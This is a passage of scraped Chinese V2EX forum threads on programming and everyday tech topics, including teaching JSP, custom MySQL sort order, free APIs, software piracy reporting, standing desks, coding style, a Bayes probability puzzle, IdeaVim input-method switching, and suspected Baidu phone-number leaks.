至于模板层是 spring mvc 是 jsp 还是 velocity 重要么", "springMVC 也是支持 JSP 的啊，教这个没毛病，要学新技术必然是自学的啊，大学的课程也不是从 Java 8 讲开去的吧", "jsf 。。。我毕设用的这玩意。。。导师指定。。。当时心里真是哔了 dog 了。。。", "我还在用 jsp+vue ， 没觉得有毛病", "一个技术，流行了挺多年，介绍一下也挺好好，花不了多少时间。起码可以让学生知道为啥不要使用像 jsp 这样的技术。了解软件工程中的糟糕设计，避免重蹈覆辙", " #66 用 servlet 确实可以不用写 jsp, 但教 jsp 以外的模板引擎教学工作量比教 jsp 大啊... 而且再怎么样的大学讲师, 也不会想背\"教出来的学生居然连 jsp 都不懂\"这样的锅吧\r", "\r", " #65 你说的没错... jsp 在我这归于前端技术, 但也是 j2ee 后端程序员学习过程中很基础 /避不开的东西...虽然现在的后端开发很多都已经和 jsp 没关系了.", "在学 spring 之前先学 servlet 和 jsp 应该是必须的，重点是学习其中的 MVC 思想。\r", "但若把 jsp 当作最基本的 php 和 asp 那样到处嵌套着 java 代码的动态模板来写网站就不合理了，该喷。", "Ruby on Rails 还仍然流行 ERB 呢（ HTML 掺 Ruby 代码）， JSP 并没有到消失的时候。现在 Java 没一个让我满意的模板引擎。", " 是的，那样写出来的代码耦合太大了", " 笑出声了 哈哈", "大连某 985 高校，电子商务，讲 asp 和 vbscript", "大学老师：“重点不是学校应该教什么，而是我自己会教什么”。", "我之前在一家公司里看到居然用了 jsp 的前端。这个项目还挺新。。。感觉很无语", " 2333 ，认识马 rx 老师和“东北 Java 第一人”吗", " ", " 233333", "不知道你们在说啥……难道不是学学数学和计算机基础就好了吗……", "现在 985 高校非计算机专业还在教 ASP 哦"]},
{"content": "", "reply": "9", "tittle": "Mac 下 webstorm 跳转到页首和页尾快捷键是什么？", "comment": ["开 Keymap 自己查啊， IDE 内置了多套方案，你也不说你用的是哪个，让人怎么回答呢。。。", "安装 ideavim ，然后 G 和 gg", "fn command 上下？", " 不行，看了下 keymap 未设置", " 这是个插件？", "启用 vim 模式， 0gg 第一行， G 最后一行", " 谢谢", " 一语道破", "所以说\r", "不管什么编辑器最后都被我用成 vim\r", "就是这个道理"]},
{"content": ["<div class=\"topic_content\">请教一个 mysql 中文排序的问题，就是某一列是有“高”、“中”、“低”三种值，然后我怎么才能 orderby 出高中低的效果？目前使用 CONVERT( FieldName USING gbk ) COLLATE gbk_chinese_ci desc 排序结果是高低中。。。求 v2 大牛知道</div>"], "reply": "16", "tittle": "请教一个 mysql 中文排序的问题，就是某一列是有“高”、“中”、“低”三种值，然后我怎么才能 orderby 出高中低的效果？", "comment": ["oracle 我知道， order by decode ，然后搜索到 MySQL 的， ORDER BY FIND_IN_SET(FieldName,\"高,中,低\")", " 可以。感谢！", "可以是可以，但是您这个数据库设计是不是有点问题", "这个数据库设计得真让人呕心沥血，新建一个字段啊， tinyint ， 3 、 2 、 1 代表对应的三个值，写个脚本替换到这个字段就行了呗", "为了程序快，增加一个字段，再加上索引", " 我是接锅虾，新建的话要改的地方目测会很多，懒～", "select * from user where bigger='高'\r", "union\r", "select * from user where bigger='中'\r", "union\r", "select * from user where bigger='低'", " 你这个方法也可以。。。赞一个", " 这也叫可以？明明只需要查一次结果被你查了 3 次", "select case \r", "  when col = '高' then 3\r", "  when col = '中' then 2\r", "  when col = '低' then 1\r", "end as priority\r", "from ...\r", "order by priority desc", " 确实应该这样，数据库设计的问题", "邪路：统一变成“ 10 高”，“ 20 中”，“ 30 低”", " 而且 union 不保证结果顺序，顺序这次符合你的预期只是巧合。", "1 楼的方案是奇技淫巧，不改变现有数据模型的临时方案可以用这个。\r", "长期的方案是把字段改成有序的数值类型或枚举类型。", "10L 的方法 +1", "DELIMITER $$\r", "\r", "USE `数据库名`$$\r", "\r", "DROP FUNCTION IF EXISTS `my_translate`$$\r", "\r", "CREATE DEFINER=`root`@`%` FUNCTION `my_translate`(param VARCHAR(100)) RETURNS VARCHAR(100) CHARSET utf8\r", "BEGIN  \r", "\tSET param = REPLACE(param,'低','a');\r", "\tSET param = REPLACE(param,'中','b');\r", "\tSET param = REPLACE(param,'高','c');\r", "\tRETURN param;  \r", "END$$\r", "\r", "DELIMITER ;\r", "\r", "\r", "然后 order by 这个 function 返回值？"]},
{"content": ["<div class=\"topic_content\">网上搜索到的大多是说聚合数据这家公司\r<br>不知道-- 聚合数据 API 数据这家怎么样\r<br>可以用么</div>"], "reply": "16", "tittle": "个人 APP 开发者，没有服务器经验，想找些免费接口调用", "comment": ["\r", "\r", "这种不是更方便吗", "聚合当年通过 sdk 搜集用户信息来着", "据说 SDK 手机用户手机通讯录等隐私数据", " 个人开发免费使用？", " #4 免费使用有限制,但个人用绝对够了,你可以去 [价格] 里面看一眼", " 恩，看了下，个人使用足够了，我先注册个账号看看，万分感谢", "嗯，一楼那个好。 leancloud", " leancloud 值得一试，文档很详细", "测试接口推荐我们产品 apizza.cc ^_^", "当初我也是这样想的 知道我遇到了 Laravel", "楼主不说明需求，楼下回答什么的都有，还有强行安利自己产品的。。。。", "接口还没有的话，都自己造数据，一般要做新功能的时候服务器接口还没写好，就是自己造数据", "我刚经历这个过程，感觉免费接口不稳定，限制多，还是自己抓网页数据比较靠谱", "找一个后端的朋友，免费接口。", " 还没开发中的接口，你让我测试啥", "   我是想找类似中央气象局提供的查询天气这样的免费 API 。自己写个 APP 练手，但是不会后台服务器啊"]},
{"content": "", "reply": "16", "tittle": "发现有人破解国外商业软件，发布破解文章并且提供这个软件的商业支持该怎么办?", "comment": ["多了去了  beyondcompare  就被江苏的某个公司这样搞", "我觉得这个罪可不轻，应该可以委托中国律师起诉\r", "给国外公司举报，举报有奖", "说一个我身边的事情  \r", "一个哥们的公司被人家告了   说他们单位使用 Server-U   是盗版的 需要支付费用   结果我哥们单位貌似赔钱了   是被国内一家法律事务所 作为代理单位 起诉的~\r", "我哥们说 貌似现在国内有很多法律事务所  专门吃这个饭的   做代理抓盗版~", "数额巨大的 FBI 会钓鱼执法，引诱到境外第三国，实施抓捕。", " 经营一家公司，首先得让自己合法合规；还得小心商标和专利上的问题，省得为别人做嫁衣。", " 已经举报了，那个软件让我学习到了很多，我不愿意看到作者的利益受到损害，如果只是自己用在我看来无关紧要，但是要是再发布我实在无法接受。", "弱弱问句啥软件", "  苏州苏杰思网络有限公司?妈呀我一直以为他们代理了这个软件", " #6  恩 是的  在我没有听说到这个故事之前， 我始终觉得在国内打击盗版真的是件离我很遥远的事情，我哥们单位也不算是大公司，当听到之后觉得原来身边真的有这样的例子啊~  引以为戒~", " 就是代理了吧", "我不喜欢这家公司： 苏州苏杰思网络有限公司\r", "好多软件官方自带中文\r", "然后代理过来以后超高价格\r", "比原官方贵为啥要在他哪里买...\r", "\r", "确认  苏州苏杰思网络有限公司 是 Beyond Compare 授权代理\r", "\r", "\r", "China\r", "\r", "Suzhou C&J Marketing Software Co.,Ltd.\r", "  Suzhou\r", "  Tel: 400-999-7658\r", "  ", " 为什么要把自己宝贵的时间浪费在这些无法解决根源的问题上?", "  \r", "Parallels Desktop 您可能是正版软件受害者\r", "国内代理的苏杰思还到处发律师函要求下架\r", "提供个关键词，老毛子的 TNT 破解组", " 无法对这种可耻的行为视而不见，告诉作者还是举手之劳，让作者决定吧。", "想问一下大家\r", "淘宝上的黑苹果服务商家是否属于同等性质"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 github 上偶然看到一个 vue 开源项目   <a href=\"https://github.com/bailicangdu/vue2-elm\" rel=\"nofollow\">地址</a></p>\n<p>它居然可以获取到真实的饿了么数据，请问这是怎么做到的，我也想写一个这样的项目，我不会后台，可以办到吗</p>\n</div></div>"], "reply": "2", "tittle": "看到一个开源项目产生的困惑", "comment": ["求解答啊，捉急", " "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>感觉身体越来越差了, 老婆批准给买了台冈村的电动可升降桌, 照理来说这个牌子是 HermanMiller 一个档次(日本没得卖他家的升降桌), 原厂来安装的. 结果发现桌子升高了之后, 打字会使桌子有轻微抖动, 带动着屏幕一起晃很难受.</p>\n<p>想知道这是这种产品的通病还是特例? 因为我看这种桌普遍都是工字腿, 这种好像都不稳. 之前买了个宜家的工字腿的桌也是抖的飞起</p>\n</div></div>"], "reply": "10", "tittle": "可升降的站立办公桌都会抖动吗? 买了台冈村的, 升高了之后打字和写字都会有抖", "comment": ["应该是你的桌面太轻了，我用的国产桌腿放五厘米老榆木板子，晃动不大", " 研究了一下感觉就是金属台面强度不够高, 发生变形, 脚很稳", "我自己做了一个。不可升降，但是坚固可靠。\r", "\r", "全部选购自 IKEA ：\r", "\r", "主体是拉克边桌，就是那个 39 块钱的爆款；配上 3.9 （具体价格不记得了）的三角撑一对；再配上最便宜的隔板一块（印象中是 17.9 ？）。自己拧几个螺丝，把隔板用三角撑固定在桌腿上就可以用来放键盘鼠标了，显示器搁在桌面上。\r", "\r", "不过当时不知道怎么的，奢侈了一下，买了一个 39 的相片挂槽。宽度和桌子刚好一模一样，用螺丝拧在侧面即可作为文具槽，我选择挂在左侧了，根据个人偏好吧。\r", "\r", "总价约 100 搞定站立工作台。缺点：不能升降前面说过了，另外隔板放键鼠的固定螺丝尽量长一点，不然受力久了不牢靠，毕竟桌子腿是刨花板做成的。", "我把桌子靠在墙上，桌边装上了几个这种滑轮，解决了问题：\r", "\r", "果然现在很流行站立办公啊\r", "淘宝上 100 多那种我也感觉不稳，但是好在功能比较全。\r", "后来有个朋友做家具，拿了两个木格来使用，一个短的，不占地方；一个长的，能用鼠标\r", "缺点：\r", "     1. 不能调节高度，身高太高的同学用不了\r", "     2.  贵，赶上机械键盘了\r", "优点： 1. 超级稳\r", "           2. 逼格超高（胡桃木、榫卯结构、木蜡油涂装（比漆环保））\r", "\r", "上图：\r", "![]( ", ")\r", "![]( ", ")\r", "![]( ", ")", "  老榆木牛逼了", " 不能调高一天下来有点累", " 谢谢~我去试试", " 哈哈 建议上个显示器, 否则低头对颈椎不好哈", " 也不能一直站着  一天站两个小时差不多了  我有台式机显示器"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为纸质书在搬家的时候实在太麻烦了,又不忍心丢掉. 打算买电子版 一般都是 pdf 的,不知道电子版的阅读体验怎么样?</p>\n</div></div>"], "reply": "114", "tittle": "你觉得编程类的书籍是电子版好,还是纸质的书好?", "comment": ["只要有电子版的书我都会买电子版的。主要是方便，随身带而且可以挤碎片时间看。\r", "然而好多书并没有电子版", " 图灵社区 异步社区 很多书有电子版", "  电子版对视力不太好", " kindle 虽然小，但是便携。。。", "电子版支持快速查询", "kindle 看一些没代码的书还是可以的，如果是源码解析之类的书，还是纸质版吧。。", "纸质的吧，不用担心看着看着锁屏了。设置长时间不锁屏的话设备续航撑不住。", " mac pro 上体验怎么样？", "   看 PDF 吗？ 体验当然更好，但如果不是办公，只是看看电子书，没必要携带 mac pro ，还不如用 ipad pro 。", "纸质不能搜索", "这个主要看个人看书的时候和习惯吧.\r", "如果能用电脑的时候我一般不会看书,\r", "不方便用电脑的时候才会看书.\r", "如果在家里更愿意看纸质书 如果是火车地铁上或者飞机上还是 kindle", " 我没有 ipad pro  看编程类的书一般都是在家看的，不会在地铁等地方上看。。。", " 搬家的时候很痛苦，对于有房子的你可能不是什么事儿了", "买了一本，在 ibooks 上打开看，效果，体验真不错啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前团队急需 java 开发；\n地点：杭州；\n等级： p6-p7 ；\n要求： 3 年及以上工作经验；\n有意私聊 联系方式： qq 785764122 ，有简历直接转 qq mail 也 OK</p>\n</div></div>"], "reply": "2", "tittle": "阿里巴巴商家技术部招聘 Java 开发", "comment": ["阿里人会留公司邮箱吧.", " qq 好沟通"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在一堆业务逻辑无限 return false 的代码里查 bug,真的很蛋疼。。。</p>\n<p>就这样～</p>\n</div></div>"], "reply": "18", "tittle": "在一堆业务逻辑无限 return false 的代码里查 bug,真的很蛋疼。。。", "comment": ["if(dataNotValid(data)){\r", "            notValid();\r", "            return false;\r", "        }\r", "        \r", "        if(dataNotMatch(data)){\r", "            notMatch();\r", "            return false;\r", "        }\r", "\r", "        handleData(data);\r", "        return true;\r", "\r", "vs\r", "\r", "        if(!dataNotValid(data)){\r", "            if (!dataNotMatch(data)){\r", "                handleData(data);\r", "                return true;\r", "            }\r", "            else {\r", "                notMatch();\r", "                return false;\r", "            }\r", "        }\r", "        else{\r", "            notValid();\r", "            return false;\r", "        }", "直接把 return false 替换为抛出错误然后外部捕捉统一返回不是更好吗？", "直接 return false 更容易理解。", " return false 不代表异常啊", " 我喜欢前一种  代码清晰   条件分拆清楚", "这个时候，就是体现代码重构的功底了！", "求看看代码张什么样啊", "建议写一个函数，将所有需要验证的逻辑作为参数数组传给这个函数。\r", "比如：\r", "验证器([\r", "()=>{验证逻辑 1},\r", "()=>{验证逻辑 2},\r", "()=>{验证逻辑 3}])\r", "\r", "验证器函数自己逐个调用这些函数，然后遇到一个 false 就直接 return 。\r", "\r", "这一朵朵奇葩一样嵌套的 if 判断也是够了。", "返回布尔型其实不是一个好的选择，分支多的情况下连哪出错都判断不了", " 所以现在大多数情况下我喜欢 Preconditions", " 是啊，很蛋疼呢，哈哈", "这种情况就应该抛异常", " 除了函数，使用异常是个明智的选择", " 哈哈", " 不太方便，哈哈", " #4 并不是真的要抛出异常，我说“统一捕捉返回”的意思就是 try{ ... } catch(e) { return false; }。抛出异常其实只是跳出业务逻辑的一种手段。后期如果需要扩展、让程序返回具体的异常类型时也比较方便", "就这个来看应该重写 dataNotValid ，返回错误代码，然后再根据错误代码输出", "应该改改，返回 0 表示正常，返回非零，表示异常。\r", "\r", "然后，在前面定义宏，\r", "MATCH _ERROR = 1;\r", "VAILD_ERROR = 2;\r", "等等，或者使用枚举。\r", "\r", "然后，最后 return *_ERROR ；\r", "\r", "这样观察返回值，就知道哪里错了"]},
{"content": ["<div class=\"topic_content\">刚接触测试不久，想求经典的学习资料，书籍、视频、课程、 blog 都行～只要是干货，狠狠砸过来吧～～</div>"], "reply": "目前尚无回", "tittle": "有老司机么？移动 app 测试新人求学习资料～", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前全世界的服务器提供商多如牛毛吧，行业竞争也非常激烈，因为随便一搜太多提供商了，有点搞不明白这么多服务器提供商真的是自己拉网线建一个机房，然后聘请客服人员？？感觉这个成本有点高吧，像知名的 vultr 、 linode 以及 DO 或者 OVH 系的和普通的 one man vps 他们各自的运作模式是怎样的？小白问题，别见笑哈。</p>\n<p>另外， V2EX 能不能不要把问题自动分配节点？我提的问题 <a href=\"https://www.v2ex.com/t/351141\" rel=\"nofollow\">https://www.v2ex.com/t/351141</a> 貌似 V2EX 自动抓取关键词分配到 vps 这个冷门节点，然后就永远无法重见天日了，@livid ，同时也请删除一下 t/351141</p>\n</div></div>"], "reply": "1", "tittle": "很想知道哪些 one man 服务器是怎样的运作模式？", "comment": ["Equinix  Internap Coresite 这些租 Rack\r", "然后找运营商接线，一般机房都会有这些运营商的线，直接签你的 transit 然后用机房给你拉的线即可\r", "\r", "低级一点像我们是直接问机房买带宽，买 Rack ，这样就是二道贩子，然后组自己的 BGP 。\r", "\r", "再低级一点，也就是市面上绝对多数商家，是问二道贩子买资源，租机器，然后再分销。\r", "\r", "还有更低级的，租 KVM 开 VPS ，这边不再多说，怕被打死"]},
{"content": "", "reply": "目前尚无回", "tittle": "谷歌抓取工具显示该网页服务器错误（ 500 522 错误），但是该网页是能访问的，这可能是什么原因？", "comment": []},
{"content": ["<div class=\"topic_content\">请教大家\r<br>\r<br>我的网站是 https 的，需要通过 iframe 方式调用 http 视频，请问有办法实现加载吗？\r<br>\r<br>视频网站不支持 https ，确认\r<br>\r<br>只支持 iframe 方式引用，确认\r<br>\r<br>我的网站是 https ，不能加载，有办法解决吗？\r<br>\r<br>谢谢</div>"], "reply": "7", "tittle": "如何在 https 中使用 iframe 调用 http 内容？", "comment": ["这就是 https 的优点和特性，结果你要打破它= =\r", "或者，有这个需求的页面，就干脆不要用 https", " 已经研究两天了，可能真的要放弃 https 了，不然调用不了", "试试自己通过 https 反代 http 请求。", "这是不允许的：\r", "\r", "视频网站不支持 https ，确认 \r", "只支持 iframe 方式引用，确认 \r", "\r", "那么应该像知乎那样放弃该类视频支持，特别是在 iOS 应用这样不允许使用非 HTTPS 的场合", "换 IE6", "视频不直接嵌入页面，在页面上留下个链接算了，反正内容是外站的嘛。。。", "国内的话换 B 站"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>准备弄个钉钉机器人推送每日新闻到公司群里</p>\n<p>但是没法测试啊，个人用户又不能建群，又不可能在公司群里调试，怎么办呢？</p>\n<p>搜了很久都没看到能在哪里测试</p>\n</div></div>"], "reply": "3", "tittle": "钉钉的群机器人到底要怎么测试啊？个人用户又无法建群", "comment": ["你可以自己建一个公司群啊 我就是自己建了一个群 电脑客户端 创建 内部群聊天 然后选择公司 直接确定 群里就你一个人了", " #1 等一下……为啥我手机上要至少 6 个人……建群成功了，好丢脸，求删此贴…… ", " ", "拉人再删人就行"]},
{"content": ["<div class=\"topic_content\">问题在这里 <a target=\"_blank\" href=\"https://www.zhihu.com/question/57767596\" rel=\"nofollow\">https://www.zhihu.com/question/57767596</a> 开发当中有哪些明确的痛点?\r<br>\r<br>或者说说看 React 社区, Rx 社区, Angular 社区, Vue 社区, 搞了那么多稀奇古怪的技术, 哪些命中了你的痛点?</div>"], "reply": "2", "tittle": "调查一下: 最近一年前端技术栈哪些技术点最困扰你?", "comment": ["jQuery 究竟还是不是他们大爷。。", "当初学 coffe 和 angular\r", "我还没学会就过气了\r", "不禁庆幸还好没学会啊_(:зゝ∠)_"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在复习概率论，看了一些贝叶斯概率的题目，感觉一般人的直觉可靠性真的不高。</p>\n<p><strong>问题</strong></p>\n<p>若某种疾病在所有人中患病率为 1%，若患病，检验结果为阳性的概率为 90%，未患病，而检验结果为阳性的概率为 9%。</p>\n<p>如果我被检验为阳性，那么我真正患病的概率为多少？</p>\n<p>70%?</p>\n<p>60%?</p>\n<p>50%?</p>\n<p>40%?</p>\n<p>10%?</p>\n<p><strong>答案</strong></p>\n<p>只是 9%, 问题的关键在于某种疾病在所有人中的患病率，而不单单是检验的可靠性</p>\n<p><a href=\"https://github.com/Windsooon/What-Bayes-tell-us-/blob/master/README_CHINESE.md\" rel=\"nofollow\">github 图文版</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "贝叶斯概率告诉我们直觉多么不可靠", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>希望大家多多提交</p>\n<ol>\n<li>后端开发常用的各种中间件</li>\n<li>各种优雅的后端开发任务解决方案</li>\n<li>好用的云服务</li>\n<li>好用的 API</li>\n<li>各种对应的学习资料</li>\n</ol>\n<p>Github: <a href=\"https://github.com/sunchen009/awesome-backend\" rel=\"nofollow\">https://github.com/sunchen009/awesome-backend</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "工作不忙挖个坑，建立了个 awesome-backend 收集展示后端开发相关组件和解决方案", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>再也不敢标题党了</p>\n<p>分享一篇深度好文，干货满满</p>\n<p><a href=\"https://www.qcloud.com/community/article/207618001486449512?fromSource=gwzcw.58479.58479.58479\" rel=\"nofollow\">HTTPS 协议深度解析，为什么小程序开发者需要关注</a></p>\n<p>也欢迎大家留言， V 友们期望看到我发什么样的内容呢？</p>\n</div></div>"], "reply": "6", "tittle": "HTTPS 协议深度解析，为什么小程序开发者需要关注", "comment": ["大额度优惠码 😀", "这次走 https 了，但竟然是赛门铁克证书Σ(ﾟ∀ﾟﾉ)ﾉ", "一点也不好，无限放大 https 的难度，好让别人用你们的产品，软文一篇", "google 和 symantec 干上了，说不定过不了多久 symantec 的证书也不值钱了。", " 你看看免费套餐合适你不？[腾讯云服务器免费六个月]( ", ")", "腾讯天天来抱 v2 大腿（逃"]},
{"content": ["<div class=\"topic_content\">之前在网上看到一个帖子 用 xcode 做的一个小程序（大概就是生成 iphone 模拟器 然后输入某某的名字，下面哟有个拆礼物的标志，点击拆礼物会出先自己之前设定的照片和字 ） 我也照着网上的指示做了 问题就是网上的那个版本是 xcode5 我的事 xcode8.2 ，有点区别 本人又是个菜鸟，想做个程序讨女票的欢心 但是无奈一直做不出来，希望有会的大神指点一二。 谢谢！</div>"], "reply": "2", "tittle": "XCODE 大神请进，", "comment": ["天下没有免费的午餐", "如果只是这么个简单的功能的话，我怎么感觉 ppt 也可以==\r", "不过认真的说，你可以参考下[Apple 官方最新的教程]( ", " 30 分钟，就可以做出这个需求了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是份来自 GitHub 的开源调查，我估计意在用数据来优化开源过程。今天下午刚看到的，所以也在 V2 倡导一下你们去提供多点数据。</p>\n<ul>\n<li>问卷入口： <a href=\"https://www.surveygizmo.com/s3/3150898/Open-Source-Survey\" rel=\"nofollow\">https://www.surveygizmo.com/s3/3150898/Open-Source-Survey</a> （应该是这个，如果有误可以等一下 GitHub 页面，应该会自动弹出一个参与入口给各位）</li>\n<li>项目源地址： <a href=\"https://github.com/github/open-source-survey\" rel=\"nofollow\">https://github.com/github/open-source-survey</a></li>\n</ul>\n</div></div>"], "reply": "10", "tittle": "作为一名开源崇尚者，理应倡导一下这份调查", "comment": ["填完了，最后居然还问\r", "\r", "42. What is your gender?\r", "Man\r", "Woman\r", "Non-binary or Other\r", "Prefer not to say\r", "\r", "43. Do you identify as transgender?\r", "Yes\r", "No\r", "Not sure\r", "Prefer not to say\r", "\r", "44. Do you identify as gay, lesbian, bisexual, asexual, or any other minority sexual orientation?\r", "Yes\r", "No\r", "Not sure\r", "Prefer not to say", "23333 gay 才是亮点，就是想问问你们这群开发者是不是 gay ， GayHub 的黑历史。", " 23333 gay 才是亮点，就是想问问你们这群开发者是不是 gay ， GayHub 的黑历史。", " GayHub 的黑历史 😂 这个调查会公开结果吗？上哪儿看结果呢？", " \r", "Programmer != Gay\r", "Gay != Programmer", "安利一下我一直在用的 ", "r#6 @", " 发错", " 我没看文档，不清楚是否公布。", " 判等并非严格", " nice"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>其实所有的 vim 都有这个问题,就是正在使用中文输入法编辑中文,切换回 normal 模式的时候,需要自己再切换一次输入法到英文才能正常进行 vim 操作.</p>\n<p>请问有人有解决方案吗?</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>参照smartim的代码写了个本地动态库,然后开发了一个小插件.作为IdeaVIm的扩展.</p>\n<p>安装后在编辑器中输入\":set switch-to-english-when-exit-insert-mode\",这个把这个命令加入到~/.ideavimrc中,即可启用该功能.</p>\n<p>目前只能支持macOS因为不会写LInux/Windows的Native代码,希望有兴趣的朋友可以帮忙补充.</p>\n<p>有需要的朋友可以下载使用,多提意见.</p>\n<p><a href=\"https://pan.baidu.com/s/1nuMXnIx\" rel=\"nofollow\">https://pan.baidu.com/s/1nuMXnIx</a></p>\n</div></div>"], "reply": "14", "tittle": "IDEA 的 ideavim 插件使用问题", "comment": ["解决方案就是：\r", "\r", "> 正在使用中文输入法编辑中文,切换回 normal 模式的时候,需要自己再切换一次输入法到英文才能正常进行 vim 操作", "我是按 shift 切换中英文，感觉还好", "切回 normal 的时候按下 shift", " 这样还是有问题的,不是每次都要按下 shift,有时候本来就是英文状态.这样不能行程惯性习惯,键盘操作很不友好.", "1. 写英文注释\r", "2. 让中文输入法打完一组汉子后自动切换到英文状态(并不知道怎么办到", "输入完中文，手动切换输入法，你就当进入了另外一个模式， chinese-mode :)", " 1. 英文书写能力有限,全部写英文注释不可能,团队成员也不可能看得懂.还有些提示消息文案什么的一定是中文的.\r", "2. 自动切换英文并不是不可能,我改了一下 ideavim 的代码调用 github 上 ybian/smartim 这个项目里面的 im-select 可以实现.但是这个好麻烦,所以想在这里问问有没有其他人有类似的经验可以分享.", "fcitx.vim 插件，可以在进入 normal 后自动切到英文，进入 insert 再切到中文， macOS 上试过可用， Linux 上应该也可以", " vim 本就引入了几种模式已经玩不转了,好在所有的模式按 esc 都能返回 normal,但是你说的 chinese-mode 是独立的需要另外一种操作才能返回 english.习惯上不好做.", " 首先我是要在 ideavim 里面用,应该是不支持原生的 vim 插件的.\r", "\r", "还有命令行里面的 vim 我也需要这个自动切换的功能,昨天试了一下 ybian/smartim 不知道为什么不生效.\r", "看了 fcitx.vim 的说明以为只能在 linux 下配合 fcitx 输入法使用.这个具体要怎么用?请指教", "有发现这个问题\r", "倒是没觉得很难受\r", "shift 切换中英文就多按一下 毕竟注释只在关键点写", "毕竟不是天天写注释，还算能接受", "只写英文就行了", " 写完中文后按 shift"]},
{"content": ["<div class=\"topic_content\">以上事件发生时间为 2~3 天前 真实线下朋友的经历\r<br>\r<br>一个朋友在写企业金融相关的文案。\r<br>\r<br>需要引用一下企业间小额贷款的现状，于是上百度搜索了一下小额贷款的相关信息，他只是想查一下大概利率多少，写在文案里做对比说明。没填任何个人信息，就跳转到了一些链接里面，随便查看了一下，其实也没得到具体的信息。搜索结果得到的都是留的电话让联系的广告那种，他并没在目标网站操作并留下个人信息（他只是想看看有没有网站提到大致的利率啊，操作方式，又不是真要借钱），也没有手贱拨打那些小额贷款公司电话，关了窗口就完事了。\r<br>\r<br>然后，这朋友在接下来的两天里，连续收到 11 个小额贷款公司给他打电话推销小额贷款，之前收到过任何连续推广这个的，一个月平均收到不到 1 次小额贷款公司强行推广电话，而且他的经济情况根本用不着这个。\r<br>\r<br>最后溯源，没在任何网站留下过个人手机号码，还是公司网络无法通过宽带建立一对一对应关系，唯一的可疑之处就是因为他是贴吧重度用户，搜索时候百度账号是登陆的，且搜索之后百度推广在各种网站的广告位都给他推荐各种无抵押小额贷款广告了，且百度账号绑定的是他接到电话的手机号。</div>"], "reply": "63", "tittle": "百度貌似又开发了赚钱的新买卖啊", "comment": ["这不是早就有了", "精准投放", "一个 js ，不用登录账户，手机打开百度网页，你的手机号就暴露了，具体自行 Google", "「让你手贱用百度」系列。", "这个东西早有了\r", "不仅限于手机号", " #5 \r", "你能拿到百度 ID 甚至资料信息之类我觉得很正常\r", "但是你能拿到绑定的安全手机号，觉得就不太正常了", " 这个吗 ", "\r", "感觉有点恶心啊", "样式多少年前就报道过，基于 flash cookie 和普通 cookie", "当然现在肯定多了很多花样", "贴吧是百度的\r", "贴吧账号要绑定电话号码\r", "用户用百度搜索了 “小额贷款”\r", "贷款公司找百度买电话。。", "当年百度可以用被劫持来赖 现在全站 https 看他怎么说", "看来我也得搜索下小额贷款了", "其实在网络上大家都是穿着皇帝的新衣", " [画外音：通过运营商 DPI 技术，可以截取搜索引擎的搜索行为，并将其与电话号码相关联。] \r", "难度没人觉得是运营商的问题吗", "应该早就有了吧      我现在所在的公司买信息就是向百度买的", "手机百度还是电脑百度？", "我之前搜了一下儿童乐园加盟 就收到两个儿童乐园加盟的电话", "去年实习入职的时候，公司食堂要求查肝功。\r", "搜了一下成都哪些医院可以查，隔天就有“肝病医生”加我微信，添加来源是手机号。", "就我用百度没碰到这种情况。。。房子百度了，保险业百度了，一个电话没接到", "百毒怎么还不死。。", " +1 ， 我觉得运营商的嫌疑更大", "你的头像是在搞事情，令人不适", "必应每日一图 开启美好人生", "我天天搜房贷，房子，全程百度登陆，也没见有人给我打电话，我觉得是有一个平台，拿到你的指纹再加上 wifi 环境，网络环境的判断，确定你的唯一身份，然后去平台查你的信息", "百度太没节操了", "个人觉得百度是中国现在社会风气的缩影。没有百度也有别的度干这个事。我们去大街上问问老百姓，大多数是事不关己高高挂起。只要不扣我的钱，才不管我朋友的隐私被泄露。自己被泄露了大多数发发牢骚，极少有投诉的。老百姓一盘散沙，大企业才好运作。", "其实,这个锅是浏览器的,只能说道这里了.", "不一定是百度.\r", "网站能获取你的 ip, 然后通过某种渠道购买到你手机号.\r", "\r", "之前也遇到过, 这种技术上不可能的事情国内还是通过社工搞定了", " #28 \r", "浏览器能获取根本看不见的百度绑定的安全手机号？\r", "告诉我这事儿以后，我测试过，就算找回密码显示的也有几位是星号……\r", "\r", "交流过这个信息，由于百度账号注册较早，使用的是当事人主力私人手机号，现在这个手机号在网上的用途只有四个地方，百度账号密保， QQ 密保，微信账号， gmail 绑定。他连银行卡预留的手机号都不是这个，而是我搭建的专门的短信验证平台的猫池号码。工作使用公司配发的号码。\r", "\r", "\r", "\r", " #29 \r", "我公司 IP 啊，虽然不是啥大公司，也有 70 多个员工…… IP 能反查？还是动态 IP", "虽然数据有多种收集渠道, 可能性最大的应该是运营商", " #31 \r", "办公室有 90 个工位，你查到我 IP 能确定唯一的一个使用 IP 的人的私人手机号？\r", "这是什么逻辑", " 不是用手机搜的? \r", "也许是像你说的, 是百度的问题.\r", "\r", "我只是提出一种可能性, 运营商在网页里插代码是常态, 他们基本可以做到想做的任何事.", " 没有这么复杂的逻辑,运营商,cookie,设备指纹都是明面上的玩法. 只能说只要你用某些浏览器, 你的毛片位置都知道", " #33 \r", "并不是 之前我做了一些简单调查\r", "作为一个人肉搜索的专家，没个初步结论是不会瞎给百度扣帽子的", "有什么样的父母，就会有什么样的孩子", " 在上班写文案的时候，用电脑打字，用手机搜索？肯定是电脑上开几个窗口啊，然后问题来了运营商能根据电脑访问的信息知道手机号码？", "还有人用百度?", " 百度网站已经 HTTPS 了，运营商也能拿到？\r", "楼主你用的是网站还是 app ？", "还是没看明白，你是用的手机还是电脑？手机的话是用 WiFi 还是蜂窝数据？\r", 